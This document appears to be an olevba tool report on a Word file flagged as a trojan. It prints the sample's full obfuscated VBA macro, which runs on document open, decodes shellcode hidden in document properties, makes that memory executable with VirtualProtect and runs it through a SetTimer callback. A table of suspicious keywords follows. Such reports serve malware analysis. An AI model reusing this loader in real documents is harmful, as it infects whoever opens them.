olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-bc9eaad13fbcf6cd7b4be08aac54843a09dcdb7397b7d18391bac1dde882fa26
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-bc9eaad13fbcf6cd7b4be08aac54843a09dcdb7397b7d18391bac1dde882fa26 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function TurtlenecksCephaloclasiaSynecologic Lib "user32" Alias "SetTimer" (ByVal PrinteriesMispoints As LongPtr, ByVal TurtledovingRefilled As LongPtr, ByVal AtloaxoidIrremedilessGauntest As LongPtr, ByVal XerographyExtraembryonicBlepharitis As LongPtr) As LongPtr
Private Declare PtrSafe Function CryosurgicalAusform Lib "user32" Alias "KillTimer" (ByVal NondidacticallyHemocrystallin As LongPtr, ByVal OutworkerHymenopterousLeptostracan As LongPtr) As LongPtr
Private Declare PtrSafe Function ToiledDissatisfactorilyColophonium Lib "kernel32" Alias "VirtualProtect" (ByVal PamperizeRoily As LongPtr, ByVal ClumpstAntisubmarine As LongPtr, ByVal BuzaneIntrospectMonopolizes As LongPtr, PlasmodiateContentableUnanalyzed As LongPtr) As LongPtr
#Else
Private Declare Function TurtlenecksCephaloclasiaSynecologic Lib "user32" Alias "SetTimer" ( ByVal MagnetomotiveOverofficiously As Long, ByVal GoldheadPinpoints As Long, ByVal LeukemidNonnegativityFlashbulb As Long, ByVal RecubantWitchingly As Any) As Long
Private Declare Function CryosurgicalAusform Lib "user32" Alias "KillTimer" ( ByVal GrippersOvercommendationMonosiphonous As Long, ByVal PrelegislativeLobsterSavitri As Long) As Long
Private Declare Function ToiledDissatisfactorilyColophonium Lib "kernel32" Alias "VirtualProtect"  (ByVal CircumlocutionistSchmatteLawproof As Long, ByVal DemigrateHoroscope As Long, ByVal RelocatesCircarAntipathies As Long, PorticoErythemas As Long) As Long
#End If
Private Sub Document_Open()
Dim DrawoffIrrememberable() As Byte
#If Win64 Then
DrawoffIrrememberable = CityishAikona(ActiveDocument.BuiltInDocumentProperties(MLypXGEWzoGz("Bllm96kOf")).Value)
#Else
DrawoffIrrememberable = CityishAikona(ActiveDocument.BuiltInDocumentProperties(MLypXGEWzoGz("LDiXdDX4Hk")).Value)
#End If
#If VBA7 Then
Dim CollateralsUnsignificantlyCaurale As LongPtr
Dim ConversationallyBitripinnatifid As LongPtr
Dim shellCode As LongPtr
Dim CooptingWoldesAlbococcus As LongPtr
#Else
Dim CollateralsUnsignificantlyCaurale As Long
Dim ConversationallyBitripinnatifid As Long
Dim shellCode As Long
Dim CooptingWoldesAlbococcus As Long
#End If
ConversationallyBitripinnatifid = UBound(DrawoffIrrememberable) + 1
shellCode = VarPtr(DrawoffIrrememberable(0))
ToiledDissatisfactorilyColophonium shellCode, ConversationallyBitripinnatifid, 64, VarPtr(CollateralsUnsignificantlyCaurale)
GetObject(MLypXGEWzoGz("mVUpTrW_Op")).Environment(MLypXGEWzoGz("aB5iCbYdF"))(MLypXGEWzoGz("FG39_OKEp")) = ActiveDocument.FullName
GetObject(MLypXGEWzoGz("vspzKpMH8XB")).Environment(MLypXGEWzoGz("PcRhEp5eiB"))(MLypXGEWzoGz("oihN_ZJr")) = MLypXGEWzoGz("cZeaQrOkI3s")
CooptingWoldesAlbococcus = TurtlenecksCephaloclasiaSynecologic(0, shellCode, 1, shellCode)
BurlapsDetouring 1
CryosurgicalAusform 0, CooptingWoldesAlbococcus
GetObject(MLypXGEWzoGz("usircdVZuCFu")).Environment(MLypXGEWzoGz("RMtQESxtdP_")).Remove (MLypXGEWzoGz("geh5sUSU"))
GetObject(MLypXGEWzoGz("eqiXyTvuYn")).Environment(MLypXGEWzoGz("xHUHgm4AU")).Remove (MLypXGEWzoGz("UsBepOrdYWR"))
ReDim DrawoffIrrememberable(1)
End Sub
Sub BurlapsDetouring(Finish)
Dim MinuendsPostbaptismalPhysoclistic As Long
Dim CrystallisablePsychokineticHydrome As Long
CrystallisablePsychokineticHydrome = Timer() + (Finish)
Do
MinuendsPostbaptismalPhysoclistic = Timer()
DoEvents
Loop Until MinuendsPostbaptismalPhysoclistic > CrystallisablePsychokineticHydrome
End Sub
Function RemissivenessPalatinianGastroptosia(InfaunalVomitoriumVibrato, FusilladesMicropterygoideaProcellaria)
RemissivenessPalatinianGastroptosia = Mid(InfaunalVomitoriumVibrato, FusilladesMicropterygoideaProcellaria + 1, 1)
End Function
Public Function MLypXGEWzoGz(strInput)
MLypXGEWzoGz = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function FeltedExcretaWhistle(CoalitionerFarcilite) As Long
If Int(Rnd(23)) > 2 Then
FeltedExcretaWhistle = 9000
Else
FeltedExcretaWhistle = Len(CoalitionerFarcilite)
End If
End Function
Function CityishAikona(HappingHomishEveners)
ReDim DiscigerousGuruships(FeltedExcretaWhistle(HappingHomishEveners) - 1) As Byte
Dim AthenaeumFoysen As Long, ScarpettiCrakefeetImpossibilia As Long
Dim ChangednessTriforiumParadidymis: ChangednessTriforiumParadidymis = MLypXGEWzoGz("GaXDl9K0at") & MLypXGEWzoGz("dMqfbY7g_T")
For AthenaeumFoysen = 0 To FeltedExcretaWhistle(HappingHomishEveners) - 1 Step 2
ScarpettiCrakefeetImpossibilia = AthenaeumFoysen / 2
DiscigerousGuruships(ScarpettiCrakefeetImpossibilia) = CDec(ChangednessTriforiumParadidymis & RemissivenessPalatinianGastroptosia(HappingHomishEveners, AthenaeumFoysen) & RemissivenessPalatinianGastroptosia(HappingHomishEveners, AthenaeumFoysen + 1))
Next
CityishAikona = DiscigerousGuruships
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

